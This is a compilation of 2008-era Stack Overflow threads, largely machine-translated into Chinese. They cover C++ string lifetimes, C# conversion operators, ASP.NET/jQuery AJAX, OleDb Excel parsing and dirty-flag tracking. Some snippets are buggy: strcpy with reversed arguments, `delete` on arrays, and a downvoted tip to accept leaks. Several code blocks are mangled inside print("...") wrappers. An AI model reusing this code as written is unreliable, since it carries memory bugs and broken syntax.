Developer Express Persistence Objects or [XPO](http://www.devexpress.com/Products/NET/ORM/) as it is most known. I use it for 3 years. It provides everything you need, except that it is commercial and you tie yourself with another (single company) for your development. Other than that, Developer Express is one of the best component and framework providers for the .NET platform.

An example of XPO code would be:

```
using (UnitOfWork uow = new UnitOfWork())
{
  Order order = new Order(uow);
  order.Date = DateTime.Now();
  uow.CommitChanges();
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T14:57:25.470

I suggest taking a look at the [ActiveRecord from Castle](http://www.castleproject.org/activerecord/index.html) I don't have production experience with it, I've just played around with their sample app. It seems really easy to work with, but I don't know it well enough to know if it fits all your requirements

# c++ - 缓存 const char * 作为返回类型

> ID：200857
> 
> 赞同：5
> 
> 时间：2008-10-14T11:58:47.343
> 
> 标签：c++, char, return-value

在我的 C++ 上阅读了一下，发现这篇关于 RTTI（运行时类型识别）的文章：http: [//msdn.microsoft.com/en-us/library/70ky2y6k](http://msdn.microsoft.com/en-us/library/70ky2y6k(VS.80).aspx) (VS.80).aspx 。好吧，那是另一个主题 :) - 然而，我在 -class 中偶然发现了一个奇怪的说法`type_info`，即关于`::name`-method。它说：“`type_info::name`成员函数返回一个`const char*`以空字符结尾的字符串，表示该类型的人类可读名称。指向的内存被缓存，永远不应该直接释放。”

你怎么能自己实现这样的事情！？我以前经常为这个确切的问题苦苦挣扎，因为我不想`char`为调用者创建一个新的 -array 来删除，所以我一直坚持`std::string`至今。

所以，为了简单起见，假设我想做一个返回的方法`"Hello World!"`，我们称之为

```
const char *getHelloString() const; 
```

就个人而言，我会以某种方式做到这一点（伪）：

```
const char *getHelloString() const
{
  char *returnVal = new char[13];
  strcpy("HelloWorld!", returnVal);

  return returnVal
} 
```

.. 但这意味着调用者应该`delete[]`对我的返回指针执行 a :(

提前谢谢

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-10-14T12:03:22.890

这个怎么样：

```
const char *getHelloString() const
{
    return "HelloWorld!";
} 
```

直接返回文字意味着字符串的空间由编译器在静态存储中分配，并且在整个程序期间都可用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-15T05:55:09.153

我喜欢所有关于如何静态分配字符串的答案，但这并不一定适用于所有实现，尤其是原始海报链接到其文档的实现。在这种情况下，装饰类型名称似乎是静态存储的以节省空间，而未装饰类型名称是按需计算并缓存在链表中的。

如果您对 Visual C++ 实现如何分配和缓存其内存感到好奇`type_info::name()`，不难发现。首先，创建一个小测试程序：

```
#include <cstdio>
#include <typeinfo>
#include <vector>    
int main(int argc, char* argv[]) {
    std::vector<int> v;
    const type_info& ti = typeid(v);
    const char* n = ti.name();
    printf("%s\n", n);
    return 0;
} 
```

构建它并在调试器（我使用 WinDbg）下运行它并查看`type_info::name()`. 它是否指向一个全球结构？如果是这样，WinDbg 的`ln`命令将告诉最接近符号的名称：

```
0:000> ?? n
char * 0x00000000`00857290
 "class std::vector<int,class std::allocator<int> >"
0:000> ln 0x00000000`00857290
0:000> 
```

`ln`没有打印任何内容，这表明该字符串不在任何特定模块拥有的地址范围内。如果它在数据或只读数据段中，它将在该范围内。让我们通过在所有堆中搜索以下返回的地址来查看它是否在堆上分配`type_info::name()`：

```
0:000> !heap -x 0x00000000`00857290
Entry             User              Heap              Segment               Size  PrevSize  Unused    Flags
-------------------------------------------------------------------------------------------------------------
0000000000857280  0000000000857290  0000000000850000  0000000000850000        70        40        3e  busy extra fill 
```

是的，它是在堆上分配的。在程序的开头放置一个断点`malloc()`并重新启动程序来确认它。

查看中的声明`<typeinfo>`可以了解堆指针的缓存位置：

```
struct __type_info_node {
    void *memPtr;
    __type_info_node* next;
};

extern __type_info_node __type_info_root_node;
...
_CRTIMP_PURE const char* __CLR_OR_THIS_CALL name(__type_info_node* __ptype_info_node = &__type_info_root_node) const; 
```

如果您`__type_info_root_node`在调试器中找到 的地址并沿着列表向下走，您会很快找到一个包含与`type_info::name()`. 该列表似乎与缓存方案有关。

原始问题中链接的 MSDN 页面似乎填补了空白：名称存储在其装饰形式中以节省空间，并且可以通过`type_info::raw_name()`. 当您`type_info::name()`第一次调用给定类型时，它会取消修饰名称，将其存储在堆分配的缓冲区中，缓存缓冲区指针并返回它。

链表也可用于在程序退出期间释放缓存的字符串（但是，我没有验证是否是这种情况）。这将确保在您运行内存调试工具时它们不会显示为内存泄漏。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T12:10:03.233

哎呀，如果我们只是在谈论一个函数，那么您总是希望返回相同的值。这很简单。

```
const char * foo() 
{
   static char[] return_val= "HelloWorld!";
   return return_val;
} 
```

棘手的一点是，当您开始缓存结果时，您必须考虑线程，或者当您的缓存失效时，并尝试将内容存储在线程本地存储中。但是，如果它只是立即复制的一次性输出，那么这应该可以解决问题。
或者，如果您没有固定大小，则必须做一些事情，您必须使用任意大小的静态缓冲区。在其中您最终可能会有太大的东西，或者转向托管类说`std::string`。

```
const char * foo() 
{
   static std::string output;
   DoCalculation(output);
   return output.c_str();
} 
```

也是函数签名

```
const char *getHelloString() const; 
```

仅适用于成员函数。此时您不需要处理静态函数局部变量，只需使用成员变量即可。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T14:20:00.117

在实现分配一块内存然后期望调用者释放它的函数时要小心，就像您在 OP 中所做的那样：

```
const char *getHelloString() const
{
  char *returnVal = new char[13];
  strcpy("HelloWorld!", returnVal);

  return returnVal
} 
```

通过这样做，您将内存的所有权转移给调用者。如果您从其他函数调用此代码：

```
int main()
{
  char * str = getHelloString();
  delete str;
  return 0;
} 
```

...转移内存所有权的语义不明确，从而导致更容易出现错误和内存泄漏的情况。

此外，至少在 Windows 下，如果这两个函数位于 2 个不同的模块中，则可能会损坏堆。特别是，如果 main() 在 hello.exe 中，在 VC9 中编译，而 getHelloString() 在 utility.dll 中，在 VC6 中编译，则在删除内存时会损坏堆。这是因为 VC6 和 VC9 都使用它们自己的堆，而且它们不是同一个堆，所以你从一个堆分配并从另一个堆释放。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T12:05:11.967

我认为，既然他们知道它们的数量是有限的，他们就会永远保留它们。在某些情况下您可能会这样做，但作为一般规则，std::string 会更好。

他们还可以查找新调用以查看他们是否已经创建了该字符串并返回相同的指针。同样，根据您在做什么，这也可能对您有用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T13:27:05.310

Why does the return type need to be `const`? Don't think of the method as a *get* method, think of it as a *create* method. I've seen plenty of API that requires you to delete something a creation operator/method returns. Just make sure you note that in the documentation.

```
/* create a hello string
 * must be deleted after use
 */
char *createHelloString() const
{
  char *returnVal = new char[13];
  strcpy("HelloWorld!", returnVal);

  return returnVal
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-14T13:35:51.987

当我需要这种功能时，我经常做的是在类中有一个 char * 指针 - 初始化为 null - 并在需要时进行分配。

即：

```
class CacheNameString
{
    private: 
        char *name;
    public:
        CacheNameString():name(NULL)  { }

    const char *make_name(const char *v)
    {
        if (name != NULL)
            free(name);

        name = strdup(v);

        return name;
    }

}; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-14T17:54:20.823

The advice given that warns about the lifetime of the returned string is sound advise. You should always be careful about recognising your responsibilities when it comes to managing the lifetime of returned pointers. The practise is quite safe, however, provided the variable pointed to will outlast the call to the function that returned it. Consider, for instance, the pointer to const char returned by `c_str()` as a method of class `std::string`. This is returning a pointer to the memory managed by the string object which is guaranteed to be valid as long as the string object is not deleted or made to reallocate its internal memory.

In the case of the `std::type_info` class, it is a part of the C++ standard as its namespace implies. The memory returned from `name()` is actually pointed to static memory created by the compiler and linker when the class was compiled and is a part of the run time type identification (RTTI) system. Because it refers to a symbol in code space, you should not attempt to delete it.

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-14T13:51:45.837

这样的事情会做：

```
const char *myfunction() {
    static char *str = NULL; /* this only happens once */
    delete [] str; /* delete previous cached version */
    str = new char[strlen("whatever") + 1]; /* allocate space for the string and it's NUL terminator */
    strcpy(str, "whatever");
    return str;
} 
```

编辑：我想到的是，一个很好的替代品可能是返回一个 boost::shared_pointer 。这样，调用者可以随心所欲地保留它，而不必担心显式删除它。一个公平的妥协国际海事组织。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2010-01-16T22:15:42.223

我认为这样的事情只能使用对象和 RAII 习语“干净地”实现。当对象析构函数被调用（obj 超出范围）时，我们可以放心地假设`const char*`指针不再被使用。

示例代码：

```
class ICanReturnConstChars
{
    std::stack<char*> cached_strings
    public:
    const char* yeahGiveItToMe(){
        char* newmem = new char[something];
        //write something to newmem
        cached_strings.push_back(newmem);
        return newmem;
    }
    ~ICanReturnConstChars(){
        while(!cached_strings.empty()){
            delete [] cached_strings.back()
            cached_strings.pop_back()
        }
    }
}; 
```

我知道的唯一另一种可能性是通过 smart_ptr ..

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2008-10-14T12:07:08.670

它可能是使用静态缓冲区完成的：

```
const char* GetHelloString()
{
    static char buffer[256] = { 0 };
    strcpy( buffer, "Hello World!" );
    return buffer;
} 
```

这个缓冲区就像一个全局变量，只能从这个函数访问。

* * *

## 回答 #12

> 赞同：-5
> 
> 时间：2008-10-14T12:10:19.070

你不能依赖 GC；这是 C++。这意味着您必须保持内存可用，直到程序终止。你根本不知道什么时候可以安全地删除[]它。所以，如果你想构造并返回一个 const char*，简单的 new[] 并返回它。接受不可避免的泄漏。

# c# - C#：这是如何工作的：Unit myUnit = 5;

> ID：200858
> 
> 赞同：14
> 
> 时间：2008-10-14T11:58:49.340
> 
> 标签：c#, struct, typeconverter

我刚刚注意到您可以在 C# 中执行此操作：

```
Unit myUnit = 5; 
```

而不必这样做：

```
Unit myUnit = new Unit(5); 
```

有谁知道我如何用自己的结构来实现这一点？我查看了带有反射器的 Unit 结构并注意到正在使用 TypeConverter 属性，但是在为我的结构创建自定义 TypeConverter 之后，我仍然无法让编译器允许这种方便的语法。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2008-10-14T12:06:10.090

您需要提供从 int 到 Unit 的隐式转换运算符，如下所示：

```
 public struct Unit
    {   // the conversion operator...
        public static implicit operator Unit(int value)
        {
            return new Unit(value);
        }
        // the boring stuff...
        private readonly int value;
        public int Value { get { return value; } }
        public Unit(int value) { this.value = value; }
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T12:02:01.380

您需要为采用 Int32 的类提供强制转换运算符。

# command-line - Adobe AIR 应用程序可以通过命令行输出运行到控制台吗？

> ID：200860
> 
> 赞同：7
> 
> 时间：2008-10-14T11:59:07.233
> 
> 标签：command-line, console, air, stdout

我有一个 AIR 应用程序，它通过 onInvoke 获取命令行参数。一切都很好，但我不知道如何将一些状态消息打印回用户（可以说是标准输出/控制台）。可能吗？

即使是跟踪的默认日志文件也可以，但我在任何地方都找不到有关它的任何信息。我需要创建自己的日志文件吗？现在那太傻了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T12:16:24.860

看看[CommandProxy](http://www.mikechambers.com/blog/2008/01/17/commandproxy-net-air-integration-proof-of-concept/)。它是 AIR 应用程序的低级包装器，可让您将命令从 AS3 发送回代理，以便与底层操作系统进行通信。您应该能够通过这种方法添加一种写入命令行的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T19:52:56.200

默认情况下，trace() 将输出到标准输出。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T12:18:21.080

我不认为这是可能的，但我不完全确定。

您可以配置一个 flashlog.txt 文件，以便将所有 trace() 语句记录到其中。查看这篇文章[http://www.digitalflipbook.com/archives/2005/07/trace_from_the.php](http://www.digitalflipbook.com/archives/2005/07/trace_from_the.php)以获取有关如何设置它的更多信息。这是用于从浏览器登录，但我很确定它也应该在空中应用程序中工作。

此外，您可以使用 Powerflasher 的 SOS MAX 通过 XML 套接字登录到外部控制台。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-07-05T22:37:37.673

如果您愿意，您的 AIR 应用程序就是一个大的跟踪窗口。

# asp.net - JQuery：Visual Studio，错误 CS1056：意外字符“$”

> ID：200863
> 
> 赞同：7
> 
> 时间：2008-10-14T12:00:21.053
> 
> 标签：asp.net, jquery, visual-studio-2008

试图在 ASP.NET 应用程序中包含 ThickBox（来自[http://jquery.com/demo/thickbox/ ）。](http://jquery.com/demo/thickbox/)

当我尝试运行带有错误的应用程序时，Visual Studio 失败：js\ThickBox\jquery-1.2.6.min.js(11): error CS1056: Unexpected character '$'

使用 Visual Studio 2008 和 jquery 1.2.6

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-02-03T18:45:38.170

CS1056 显然是一个 C# 编译器错误。当您将 runat="server" 放在客户端脚本包含标记中时会发生这种情况（Visual Studio 尝试编译您的 .js 文件，就好像它是 C# 一样）。只需删除 runat="server" 属性并重试。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T12:25:13.080

可能是因为 jQuery $ 和 asp.net 脚本库定义的那个冲突。

你可以调用 jQuery.noConflict() 然后使用 jQuery 而不是 $。例如，您将调用 jQuery("#test") 而不是 $("#test")。

有关更多信息，请参阅[http://docs.jquery.com/Core/jQuery.noConflict](http://docs.jquery.com/Core/jQuery.noConflict)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-05T11:35:58.673

当我们将 runat="server" 放在脚本标签中时，就会发生此错误。

例如：

```
script  type="text/javascript" id="kk" runat="server" src="js/vendor/custom.modernizr.js" 
```

所以只需删除 runat=server 然后这个错误就不会出现。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-17T13:57:10.667

`onClick`当我在我的 asp 服务器控件的情况下编写 jQuery 代码时，这发生在我身上。

`onClientClick`为此目的肯定是一个更好的选择；）

# jquery - 如何在没有 jquery 的情况下从 javascript 调用 .net 页面方法？

> ID：200869
> 
> 赞同：2
> 
> 时间：2008-10-14T12:02:56.573
> 
> 标签：jquery, .net, ajax

我一直在尝试从我自己的 JavaScript 代码中调用页面方法，但它不起作用。如果我使用 jQuery AJAX，我可以成功调用页面方法，但我需要从我自己的 JavaScript 代码中执行此操作，因为我们不能使用第三方库（我们正在构建自己的库）。

每当我使用 jQuery AJAX 方法时，我都会得到页面方法的结果，而当我使用自定义 JS 方法时，我会从 AJAX 请求中获取整个页面。

jQuery 处理 AJAX 请求的方式肯定有所不同。有谁知道会是什么？

下面是我用来调用与 jQuery 相同的页面方法的代码，它有效，以及我用来自己调用它的代码。

**jQuery**

```
// JScript File
$(document).ready(function() {
  $("#search").click(function() {
    $.ajax({
      type: "POST",
      url: "Account.aspx/GetData",
      data: "{}",
      contentType: "application/json; charset=utf-8",
      dataType: "json",
      success: function(msg) {
        // Substitui o conteúdo da DIV vom o retorno do Page Method.
        displayResult(msg);
      }
    });
  });
}); 
```

**自定义 JS**

```
function getHTTPObject() {
    var xhr = false;
    if (window.XMLHttpRequest) {
        xhr = new XMLHttpRequest();
    } else if (window.ActiveXObject) {
        try {
            xhr = new ActiveXObject("Msxml2.XMLHTTP");
        } catch(e) {
            try { 
                xhr = new ActiveXObject("Microsoft.XMLHTTP");
            } catch(e) {
                xhr = false;
            }
        }
    }
    return xhr;
}

function prepareLinks() {
    var btn  = document.getElementById("search");
    btn.onclick = function() {
        var url = "Account.aspx/GetData"
        return !grabFile(url);
    }    
}

function grabFile(file) {
    var request = getHTTPObject();
    if (request) {
        displayLoading(document.getElementById("result"));
        request.onreadystatechange = function() {
            parseResponse(request);
        };
        //Abre o SOCKET
        request.open("GET", file, true);
        //Envia a requisição
        request.send(null);
        return true;
    } else {
        return false;
    }
}

function parseResponse(request) {
    if (request.readyState == 4) {
        if (request.status == 200 || request.status == 304) {
            var details = document.getElementById("result");
            details.innerHTML = request.responseText;
            fadeUp(details,255,255,153);
        }
    }
}

function addLoadEvent(func) {
    var oldonload = window.onload;
    if (typeof window.onload != 'function') {
        window.onload = func;
    } else {
        window.onload = function() {
        if (oldonload) {
            oldonload();
        }
            func();
        }
    }
}

addLoadEvent(prepareLinks); 
```

**更新：**我决定接受 Stevemegson 的回答，因为他的回答是我问题的真正原因。但我想与你分享一些我发现的这个问题的替代方案。

*Stevemegson 的回答*：我所要做的就是更改为 POST 请求并将请求标头设置为 JSON，这解决了我在请求页面方法时遇到的问题，但现在我很难处理响应（我会说关于另一个问题的更多信息）。

这是获取这些东西的正确代码：

```
print("function prepareLinks() {
var list = document.getElementById("search");
list.onclick = function() {
    var url = "PMS.aspx/GetData"
        return !grabFile(url);
    } }");

print("function grabFile(file) {
var request = getHTTPObject();
if (request) {
    //Evento levantado pelo Servidor a cada mudança de Estado na 
    //requisição assíncrona
    request.onreadystatechange = function() {
        parseResponse(request);
    };        
    //USE POST
    request.open('POST', file, true);
    //SET REQUEST TO JSON
    request.setRequestHeader('Content-Type', 'application/json');
    // SEND REQUISITION
    request.send(null)
    return true;
} else {
    return false;
}
}"); 
```

*Brendan 的回答*：通过 Brendan 的回答，我对 ICallBack 接口和 ICallBackEventHandler 做了一些研究。令我惊讶的是，这是一种使用 Microsoft 的 AJAX 请求实现来开发 aspx 页面的方法。事实证明这是一个非常有趣的解决方案，因为它不需要任何 JS 库来运行，而且它位于 .Net Framework 内部，我相信只有少数人知道这些东西（至少我周围的人没有）一点都不知道）。如果您想了解更多关于 ICallBack 的信息，请查看 MS 上的此[链接文本](http://msdn.microsoft.com/en-us/library/ms178208(VS.80).aspx "如何实现 ICallBack 以及所有内容")，或者复制并粘贴 Brendan 的答案。

*第三个解决方案：* 我发现的另一个解决方案是，我不创建 ASPX 页面来处理我的服务器端代码，而是实现 HTML 页面并调用 ASHX 文件，它们会做同样的事情，但它们会比 ASPX 页面使用更少的带宽。这个解决方案的一大优点是我设法使它与 POST 和 GET 申请一起工作。下面是代码。

ASHX 代码：

```
print("Imports System.Web
       Imports System.Web.Services
       Public Class CustomHandler
         Implements System.Web.IHttpHandler
          Sub ProcessRequest(ByVal context As HttpContext) Implements IHttpHandler.ProcessRequest
context.Response.ContentType = "text/plain"
Dim strBuilder As New System.Text.StringBuilder
strBuilder.Append("<p>")
strBuilder.Append("Your name is: ")
strBuilder.Append("<em>")
strBuilder.Append(context.Request.Form(0))
strBuilder.Append("</em>")
strBuilder.Append("</p>")
context.Response.Write(strBuilder.ToString)
End Sub
ReadOnly Property IsReusable() As Boolean Implements IHttpHandler.IsReusable
Get
  Return False
End Get End Property End Class"); 
```

JavaScript 文件：

```
print("function prepareLinks() {
var list = document.getElementById("search");
list.onclick = function() {
    var url = "CustomHandler.ashx"
        return !grabFile(url);
    }    
}");

print("function grabFile(file) {
var request = getHTTPObject();
if (request) {
    request.onreadystatechange = function() {
        parseResponse(request);
    };
    //VERSÃO do POST
    request.open('POST', file, true);
    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    request.send('name=Helton Valentini')
    return true;
} else {
    return false;
} }"); 
```

使用这三个选项中的任何一个，我们都可以在不使用 JQuery、使用我们自己的 Javacript 或使用 Microsoft 在 .Net Framework 上嵌入的资源的情况下进行异步调用。

我希望这对我们中的一些人有所帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T13:47:37.750

一种相对简单的解决方案是让您的代码隐藏实现 ICallbackEventHandler。与 jQuery 相比，它有点粗糙，但它可以工作。

```
Partial Public Class state
    Implements ICallbackEventHandler

    Private _callbackArg As String

    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        RegisterCallbackScript()
    End Sub

    Private Sub RegisterCallbackScript()  
        Dim cbRef As String = Page.ClientScript.GetCallbackEventReference(Me, "args", "RecieveServerData", "context")
        Dim cbScript As String = "function CallServer(args, context) {" & cbRef & "; }"
        ClientScript.RegisterClientScriptBlock(Me.GetType(), "CallServer", cbScript, True)
    End Sub

    Public Sub RaiseCallbackEvent(ByVal eventArgs As String) Implements ICallbackEventHandler.RaiseCallbackEvent
        _callbackArg = eventArgs
    End Sub

    Private Function GetCallbackResults() As String Implements ICallbackEventHandler.GetCallbackResult
        Dim args As String() = _callbackArg.Split(CChar("~"))
        If args(0) = "search"
            Return args(0) + "~" + GetSearchResults(args(1))
        End If
    End Function

    Private Function GetSearchResults(ByVal keyword As String) As String
        Dim htmlResults As String
        //Build your html here
        Return htmlResults 
    End Function

End Class 
```

//JavaScript

```
function searchButtonClicked(keyword) {
    CallServer('search~' + keyword);
}

function RecieveServerData(arg, context) {
    var args = arg.split('~');
    switch(args[0]){
        case 'search':
            document.getElementById('result').innerHTML = args[1]
            break;
    }
} 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T23:35:32.587

您使用 GET 请求 URL，而 jQuery 代码使用 POST。我希望页面方法只能通过 POST 调用，以允许您在请求正文中包含任何参数。您可能还需要将请求的 Content-Type 设置为 application/json，就像 jQuery 代码一样 - 我不知道 .NET 是否会接受其他内容类型。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-15T13:28:47.553

如果您使用的是 ASP.NET AJAX，则无需执行任何此操作。有一种定义明确的使用 PageMethods 的方法，它的复杂性要低得多。

代码隐藏

```
 [WebMethod]
    public static Whatever GetWhatever( int someParameter, string somethingElse )
    {
       ... make a Whatever ...

       return whatever;
    } 
```

页

```
...
<script type="text/javascript">
   function invokePageMethod(button)
   {
       var ctx = { control: button };
       var someParameter = ...get value from a control...
       var somethingElse = ...get another value from a control...
       PageMethods.GetWhatever( someParameter, somethingElse, success, failure, ctx );
   }

   function success(result,context) {
       ... rearrange some stuff on the page...
   }

   function failure(error,context) {
       ... show some error message ...
   }
</script>
...

<asp:ScriptManager runat="server" id="myScriptManager" EnablePageMethods="true">
</asp:ScriptManager>

...

<input type="button" onclick="invokePageMethod(this);" value="Do Something" /> 
```

# c# - 使用 C# 解析 XLS 文件时出现问题

> ID：200878
> 
> 赞同：3
> 
> 时间：2008-10-14T12:04:59.330
> 
> 标签：c#, excel

好的，让我们看看我是否可以使这有意义。

我编写了一个解析 Excel 文件的程序，它工作得很好。我使用以下内容进入文件：

```
string FileToConvert = Server.MapPath(".") + "\\App_Data\\CP-ARFJN-FLAG.XLS";
string connectionString = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + FileToConvert + ";Extended Properties=Excel 8.0;";
OleDbConnection connection = new OleDbConnection(connectionString);
connection.Open();
//this next line assumes that the file is in default Excel format with Sheet1 as the first sheet name, adjust accordingly
OleDbDataAdapter adapter = new OleDbDataAdapter("SELECT * FROM [CP-ARFJN-FLAG$]", connection); 
```

这很好用。但是当我在实际文件上尝试它时（它是由另一个程序提供给我的）我得到这个错误：

```
System.Data.OleDb.OleDbException: External table is not in the expected format. at System.Data.OleDb.OleDbConnectionInternal..ctor(OleDbConnectionString constr, OleDbConnection connection) at System.Data.OleDb.OleDbConnectionFactory.CreateConnection(DbConnectionOptions options, Object poolGroupProviderInfo, DbConnectionPool pool, DbConnection owningObject) at System.Data.ProviderBase.DbConnectionFactory.CreateNonPooledConnection(DbConnection owningConnection, DbConnectionPoolGroup poolGroup) at System.Data.ProviderBase.DbConnectionFactory.GetConnection(DbConnection owningConnection) at System.Data.ProviderBase.DbConnectionClosed.OpenConnection(DbConnection outerConnection, DbConnectionFactory connectionFactory) at System.Data.OleDb.OleDbConnection.Open() at wetglobe.Page_Load(Object sender, EventArgs e) 
```

但是，这就是我认为问题所在。如果我拿那个文件，并用我的本地 Excel 保存它，首先我会得到这个弹出窗口：

> CP-ARFJN-FLAG.XLS 可能包含与文本不兼容的功能（制表符分隔）。是否要以这种格式保留工作簿？
> 
> *   要保留此格式（其中不包含任何不兼容的功能），请单击是。
> *   要保留这些功能，请单击否。十以最新的 Excel 格式保存一份副本。
> *   要查看可能丢失的内容，请单击帮助。

如果我单击否，然后将其保存为当前的 Excel 格式，则程序将正常工作。

所以我假设这是以某种疯狂的旧 Excel 格式保存的？

我想我的问题是：

*   我怎么知道哪个 Excel 版本保存了这个？
*   如何在当前状态下解析它？
*   -或者- 我可以以编程方式将其保存为较新的版本吗？

我希望这很清楚......谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-14T12:31:14.753

听起来您的第三方应用程序生成的 XLS 文件可能并不是 Excel 格式——它实际上可能是一个带有 .xls 扩展名的制表符分隔的文本文件。

尝试使用文本编辑器打开它并查看。

如果它是制表符分隔的，您可以放弃 OleDB 适配器并将其作为标准文本文件打开/解析。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T14:35:21.583

如果生成的文件的格式将来可能会更改（可能在您升级第三方应用程序时），您可能更喜欢使用[Office Primary Interop Assemblies](http://www.microsoft.com/downloads/details.aspx?familyid=59DAEBAA-BED4-4282-A28C-B864D8BFA513&displaylang=en)。这些将加载 Excel 生成的任何版本或格式的文件。缺点是您需要在服务器上安装 Office。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-07-01T08:47:57.180

我解决了这个问题。Excel 文件应由 MS EXCEL 2003 生成，而不是由 MS EXCEL 2007 “另存为 97-2003”生成。所以你必须从任何来源下载文件。然后手动将数据复制到工作表中。它对我有用。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2020-05-11T05:38:26.383

**错误**

```
[OleDbException] External table is not in the expected format.   at System.Data.OleDb.OleDbConnectionInternal..ctor(OleDbConnectionString constr, OleDbConnection connection)
   at System.Data.OleDb.OleDbConnectionFactory.CreateConnection(DbConnectionOptions options, DbConnectionPoolKey poolKey, Object poolGroupProviderInfo, DbConnectionPool pool, DbConnection owningObject)
   at System.Data.ProviderBase.DbConnectionFactory.CreateNonPooledConnection(DbConnection owningConnection, DbConnectionPoolGroup poolGroup, DbConnectionOptions userOptions)
   at System.Data.ProviderBase.DbConnectionFactory.TryGetConnection(DbConnection owningConnection, TaskCompletionSource`1 retry, DbConnectionOptions userOptions, DbConnectionInternal oldConnection, DbConnectionInternal& connection)
   at System.Data.ProviderBase.DbConnectionInternal.TryOpenConnectionInternal(DbConnection outerConnection, DbConnectionFactory connectionFactory, TaskCompletionSource`1 retry, DbConnectionOptions userOptions)
   at System.Data.ProviderBase.DbConnectionInternal.OpenConnection(DbConnection outerConnection, DbConnectionFactory connectionFactory)
   at System.Data.OleDb.OleDbConnection.Open() 
```

**解决方案**

我在服务器端应用程序中遇到了上述错误。当您同时访问许多 excel 文件时，您会收到此错误。我的代码中错过了`connection.close()`和`connection.dispose()`方法。添加此代码后，问题得到解决。在 catch 块中，您也可以添加此代码以确保安全。`connection.open()`和`connection.dispose()`方法对于`Oledb`连接是强制性的。

# user-interface - 对象编辑和 isDirty() 标志

> ID：200887
> 
> 赞同：7
> 
> 时间：2008-10-14T12:07:11.040
> 
> 标签：user-interface, dns, flags

我正在开发一个系统，用户可以通过 GUI 编辑现有对象（准确地说是“过滤”域对象）。作为 UI 提示，我们只希望在用户确实修改了对象的某些内容时启用保存按钮。我想知道是否有人对这个问题有任何经验，以及解决这个问题的最佳方法是什么。

我正在考虑向域对象添加一个 isDirty() 标志。当用户开始编辑过滤器时，我会制作一个副本，将其传递给 GUI 并让用户对副本进行修改。然后，isDirty() 标志上的绑定将启用/禁用保存按钮。保存时，差异将被合并到原始对象中并保持不变。

另外，我在想如果用户撤消他对对象所做的更改会发生什么。然后 isDirty() 标志应该返回 false。所以我想实现这一点的唯一方法是将每个属性的原始值保留在域对象中。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T12:12:32.573

正确的！

此外，您可以公开两种方法： BeginEdit - 在此方法中，您将 IsDirty 标志标记为 True。表示您正在修改。当您要进行修改时调用此方法

CancelEdit - 在此方法中，将 IsDirty 标志重置为 False。这意味着您已中止编辑过程并恢复到原始状态。取消所做的任何修改时调用此方法。

一旦任何修改被保留，您还将 IsDirty 标志重置为 False。

我希望这有帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T12:25:16.277

如果您使用的是 .NET 框架，您可能想看看 Rockford Lhotka 的 CSLA .NET 框架：[http ://www.lhotka.net/cslanet/Default.aspx](http://www.lhotka.net/cslanet/Default.aspx)

CSLA 是一个成熟的框架，包括对象状态管理 (IsDirty)、撤消功能、数据绑定等等，而且它是免费和开源的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T20:00:25.983

您可以实现几个接口来帮助进行更改跟踪和撤消：INotifyPropertyChanged 和 IEditableObject。这两个接口都允许对象很好地使用数据绑定。

```
public class Person : INotifyPropertyChanged, IEditableObject
{
    private bool isDirty;

    public bool IsDirty
    {
        get { return isDirty; }
    }

    private string firstname = string.Empty;

    public string Firstname
    {
        get { return firstname; }
        set
        {
            if (firstname == value) return;
            firstname = value;
            NotifyPropertyChanged("Firstname");
        }
    }

    private string lastname = string.Empty;

    public string Lastname
    {
        get { return lastname; }
        set
        {
            if (lastname == value) return;
            lastname = value;
            NotifyPropertyChanged("Lastname");
        }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    public void NotifyPropertyChanged(string propertyName)
    {
        isDirty = true;

        if (PropertyChanged != null)
            PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
    }

    private bool inTrans;
    private Person copy;

    public void BeginEdit()
    {
        if (!inTrans)
        {
            if (copy == null)
                copy = new Person();

            copy.isDirty = isDirty;
            copy.Firstname = Firstname;
            copy.Lastname = Lastname;

            inTrans = true;
            isDirty = false;
        }
    }

    public void CancelEdit()
    {
        if (inTrans)
        {
            isDirty = copy.isDirty;
            Firstname = copy.Firstname;
            Lastname = copy.Lastname;

            inTrans = false;
        }
    }

    public void EndEdit()
    {
        if (inTrans)
        {
            copy = null;
            inTrans = false;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：1
